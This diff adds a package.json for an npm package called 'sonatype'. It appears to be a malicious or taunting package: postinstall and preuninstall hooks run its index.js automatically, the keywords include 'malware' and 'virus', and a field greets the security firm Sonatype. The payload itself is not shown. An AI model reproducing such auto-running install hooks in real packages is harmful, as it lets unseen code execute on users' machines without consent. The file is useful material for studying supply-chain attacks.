@@ -1,0 +1,26 @@
+{
+  "name": "sonatype",
+  "version": "2.0.6",
+  "description": "Hello to Sonatype!",
+  "main": "index.js",
+  "author": {
+    "name": "NullReferenceException",
+    "url": "https://cursed-mirror.glitch.me/"
+  },
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node .",
+    "preuninstall": "node .",
+    "_hello_to": "Sonatype"
+  },
+  "bin": {
+    "sonatype": "./index.js"
+  },
+  "keywords": [
+    "sonatype",
+    "virus",
+    "malware",
+    "malicious",
+    "cursed"
+  ]
+}
